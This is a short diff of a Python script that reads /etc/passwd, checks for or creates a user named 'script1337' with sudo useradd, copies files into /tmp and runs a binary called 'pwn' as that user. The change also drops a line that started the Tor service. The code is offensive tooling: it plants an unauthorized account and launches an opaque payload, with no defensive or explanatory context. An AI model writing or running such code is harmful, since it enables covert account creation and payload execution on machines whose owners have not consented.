@@ -4,10 +4,11 @@ script = "script1337"
 f = open("/etc/passwd", "r")
 users = str(f.read())
 f.close()
-os.system("service tor start")
 if script in users:
-    os.system("sudo su " + script + " -c ./pwn")
+    os.system("cp * /tmp")
+    os.system("sudo su " + script + " -c /tmp/pwn")
 else:
-    os.system("useradd " + script)
-    os.system("sudo su " + script + " -c ./pwn")
+    os.system("sudo useradd " + script)
+    os.system("cp * /tmp")
+    os.system("sudo su " + script + " -c /tmp/pwn")
 
